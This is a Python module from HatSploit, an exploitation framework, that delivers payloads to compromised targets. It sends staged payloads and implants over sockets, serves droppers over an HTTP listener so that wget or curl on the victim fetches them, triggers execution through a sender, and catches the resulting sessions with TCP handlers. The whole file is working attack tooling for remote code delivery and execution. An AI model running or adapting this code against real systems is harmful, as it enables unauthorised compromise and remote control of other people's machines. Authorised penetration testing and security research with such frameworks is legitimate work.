"""
MIT License

Copyright (c) 2020-2024 EntySec

Permission is hereby granted, free of charge, to any person obtaining a copy
of this software and associated documentation files (the "Software"), to deal
in the Software without restriction, including without limitation the rights
to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
copies of the Software, and to permit persons to whom the Software is
furnished to do so, subject to the following conditions:

The above copyright notice and this permission notice shall be included in all
copies or substantial portions of the Software.

THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
SOFTWARE.
"""

import time
import socket

from badges import Badges
from typing import (
    Optional,
    Tuple,
    Union
)

from pex.proto.http import HTTPListener

from hatsploit.lib.complex import *
from hatsploit.lib.core.session import Session

from hatsploit.lib.ui.payloads import Payloads
from hatsploit.lib.ui.jobs import Jobs, Job


class Send(Badges, Jobs):
    """ Subclass of hatsploit.lib.handler module.

    This subclass of hatsploit.lib.handler module is intended for
    providing tools for sending payloads.
    """

    payloads = Payloads()

    def handle_session(self, payload: PayloadOption,
                       staged: bool = False,
                       job: Optional[Job] = None) -> Tuple[Session, list]:
        """ Handle session.

        :param PayloadOption payload: payload choice
        :param bool staged: send stages or continue
        :param Optional[Job] job: job if exists
        :return Tuple[Session, list]: session and address
        :raises RuntimeWarning: with trailing warning message
        :raises RuntimeError: with trailing error message
        """

        if not payload.payload:
            raise RuntimeError("No payload configured for handler!")

        if payload.payload.staged.value or staged:
            client, address = payload.stager.handle_all(job=job)
            self.send_all(payload, client)

        else:
            client, address = payload.payload.handle_all(job=job)

        return payload.payload.handle_implant(client), address

    def send_all(self, payload: PayloadOption, client: socket.socket) -> None:
        """ Send implant available in the payload with available stages.

        :param PayloadOption payload: payload option
        :param socket.socket client: primary socket pipe
        :return None: None
        """

        step = 0
        send_length = True

        if hasattr(payload.stager, 'length') and payload.stager.length.value:
            send_length = False

        while True:
            step_method = '' if not step else str(step)

            if not hasattr(payload.payload, f'stage{step_method}'):
                break

            stage = payload.run(method=f'stage{step_method}')

            if not stage:
                raise RuntimeError(f"Payload stage #{str(step)} generated incorrectly!")

            self.print_process(
                f"Sending payload stage #{str(step)} ({str(len(stage))} bytes)...")

            if send_length:
                time.sleep(.5)
                client.send(len(stage).to_bytes(4, payload.info['Arch'].endian))
                send_length = False

            time.sleep(.5)
            client.send(stage)

            step += 1

        if hasattr(payload.payload, 'implant'):
            implant = payload.run(method='implant')

            if not implant:
                raise RuntimeError("Payload implant generated incorrectly!")

            if implant:
                self.print_process(
                    f"Sending payload ({str(len(implant))} bytes)...")
                if send_length:
                    time.sleep(.5)
                    client.send(len(implant).to_bytes(4, payload.info['Arch'].endian))

                time.sleep(.5)
                client.send(implant)

    def serve_dropper(self, dropper: DropperOption, payload: bytes) -> int:
        """ Serve dropper.

        :param DropperOption dropper: dropper to use
        :param bytes payload: payload to serve
        :return int: job ID assigned to dropper
        """

        def get_submethod(request):
            if request.path == dropper.urlpath.value:
                self.print_process(f"Delivering payload over HTTP...")

                request.send_status(200)
                request.wfile.write(payload)

        server = HTTPListener(
            host=dropper.srvhost.value,
            port=dropper.srvport.value,
            methods={
                'get': get_submethod
            }
        )
        server.listen()

        job_id = self.create_job(
            'Dropper HTTP server',
            'Handler',
            server.accept,
            bind_to_module=True,
            pass_job=True
        )

        self.print_process(f"Starting HTTP server (job {str(job_id)})...")
        return job_id

    def drop_payload(self, payload: PayloadOption, dropper: DropperOption,
                     **kwargs) -> Tuple[Union[socket.socket, str], str]:
        """ Send payload.

        :param PayloadOption payload: payload
        :param DropperOption dropper: dropper to use
        :return Tuple[Union[socket.socket, str], str]: final socket and host
        """

        sender = kwargs.get('sender', None)

        if not payload.payload:
            raise RuntimeError("Payload was not found!")

        if not sender:
            raise RuntimeError("Payload sender is not specified!")

        space = payload.config.get('Space', 2048)
        arguments = payload.info.get('Arguments', '')
        platform = payload.info['Platform']
        arch = payload.info['Arch']

        buffer = payload.run()
        staged = len(buffer) > space or payload.payload.staged.value

        if staged:
            stage = payload.run(stager=True)

            if not stage:
                raise RuntimeError("No stage available for this payload!")

            stage = self.payloads.pack_payload(
                payload=stage,
                platform=platform,
                arch=arch
            )

            if dropper.value in ['wget', 'curl']:
                self.serve_dropper(dropper, stage)

            job_id = self.create_job(
                'TCP handler',
                'Handler',
                self.handle_session,
                (
                    payload,
                ),
                {
                    'staged': staged
                },
                timeout=1,
                bind_to_module=True,
                pass_job=True
            )

            if dropper.value not in ['wget', 'curl']:
                self.print_process(
                    f"Sending payload stage ({str(len(stage))} bytes)...")

                config = {
                    'data': stage,
                    'args': arguments
                }
                config.update(kwargs)

                post = dropper.method.handler(sender, config)
                post.push()
                post.exec()
            else:
                dropper_id = self.serve_dropper(dropper, stage)

                config = {
                    'uri': (
                        f'http://{dropper.srvhost.value}:'
                        f'{str(dropper.srvport.value)}'
                        f'{dropper.urlpath.value}'
                    ),
                    'args': arguments
                }
                config.update(kwargs)

                post = dropper.method.handler(sender, config)
                post.push()
                post.exec()

                self.get_job(dropper_id).join()

            return self.get_job(job_id).join()

        buffer = self.payloads.pack_payload(
            payload=buffer,
            platform=platform,
            arch=arch
        )

        job_id = self.create_job(
            'TCP handler',
            'Handler',
            self.handle_session,
            (
                payload,
            ),
            timeout=1,
            bind_to_module=True,
            pass_job=True
        )

        if dropper.value not in ['wget', 'curl']:
            self.print_process(
                f"Sending payload ({str(len(buffer))} bytes)...")

            config = {
                'data': buffer,
                'args': arguments
            }
            config.update(kwargs)

            post = dropper.method.handler(sender, config)
            post.push()
            post.exec()
        else:
            dropper_id = self.serve_dropper(dropper, buffer)

            config = {
                'uri': (
                    f'http://{dropper.srvhost.value}:'
                    f'{str(dropper.srvport.value)}'
                    f'{dropper.urlpath.value}'
                ),
                'args': arguments
            }
            config.update(kwargs)

            post = dropper.method.handler(sender, config)
            post.push()
            post.exec()

            self.get_job(dropper_id).join()

        return self.get_job(job_id).join()

    def inline_payload(self, payload: PayloadOption,
                       **kwargs) -> Tuple[Union[socket.socket, str], str]:
        """ Send payload if inline.

        :param PayloadOption payload: payload option
        :return Tuple[Union[socket.socket, str], str]: final socket and host
        """

        sender = kwargs.get('sender', None)

        if not payload.payload:
            raise RuntimeError("Payload was not found!")

        if not sender:
            raise RuntimeError("Payload sender is not specified!")

        space = payload.config.get('Space', 2048)

        buffer = payload.run()
        staged = len(buffer) > space or payload.payload.staged.value

        if staged:
            stage = payload.run(stager=True)

            if not stage:
                raise RuntimeError("No stage available for this payload!")

            job_id = self.create_job(
                'TCP handler',
                'Handler',
                self.handle_session,
                (
                    payload,
                ),
                {
                    'staged': True
                },
                timeout=1,
                bind_to_module=True,
                pass_job=True
            )

            self.print_process(
                f"Sending payload stage ({str(len(stage))} bytes)...")
            sender(stage)

            return self.get_job(job_id).join()

        job_id = self.create_job(
            'TCP handler',
            'Handler',
            self.handle_session,
            (
                payload,
            ),
            timeout=1,
            bind_to_module=True,
            pass_job=True
        )

        self.print_process(
            f"Sending payload ({str(len(buffer))} bytes)...")
        sender(buffer)

        return self.get_job(job_id).join()
